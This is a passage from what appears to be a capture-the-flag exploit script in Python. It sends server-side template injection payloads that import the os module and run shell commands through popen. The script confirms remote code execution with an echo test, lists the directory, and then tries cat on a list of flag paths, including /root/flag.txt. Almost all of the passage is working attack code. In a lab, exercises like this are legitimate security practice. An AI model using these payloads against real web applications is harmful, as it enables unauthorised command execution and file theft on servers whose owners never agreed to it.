    print("[+] Step 1: Testing RCE with simple command...")
    test_payload = '{{ __builtins__.__import__("os").popen("echo pwned").read() }}'
    response = send_payload(test_payload)
    
    if response:
        output = extract_output(response)
        if output and 'pwned' in output:
            print(f"[+] RCE confirmed! Output: {output}")
        else:
            print(f"[!] RCE test failed. Got: {output}")
            return
    else:
        print("[!] Failed to get response")
        return
    
    print()
    
    # Step 2: List files in current directory
    print("[+] Step 2: Listing files in current directory...")
    list_payload = '{{ __builtins__.__import__("os").popen("ls -la").read() }}'
    response = send_payload(list_payload)
    
    if response:
        file_list = extract_output(response)
        print(f"[+] Files in current directory:\n{file_list}")
        print()
        
        # Check if flag.txt is in the list
        if 'flag.txt' in file_list:
            print("[+] flag.txt found! Attempting to read it...")
            flag_payload = '{{ __builtins__.__import__("os").popen("cat flag.txt").read() }}'
            response = send_payload(flag_payload)
            if response:
                flag_content = extract_output(response)
                flag = extract_flag(flag_content)
                if flag:
                    print(f"[!] FLAG FOUND: {flag}")
                    print(f"[+] Payload used: {flag_payload}")
                    return flag
    
    print()
    
    # Step 3: Test common flag paths
    print("[+] Step 3: Testing common flag paths...")
    common_paths = [
        '/flag.txt',
        '/app/flag.txt',
        './flag.txt',
        '/tmp/flag.txt',
        '/home/flag.txt',
        '/root/flag.txt'
    ]
    
    for path in common_paths:
        print(f"[+] Trying: {path}")
        cmd = f'cat {path}'
        payload = f'{{{{ __builtins__.__import__("os").popen("{cmd}").read() }}}}'
        response = send_payload(payload)
        
        if response:
            content = extract_output(response)
            flag = extract_flag(content)
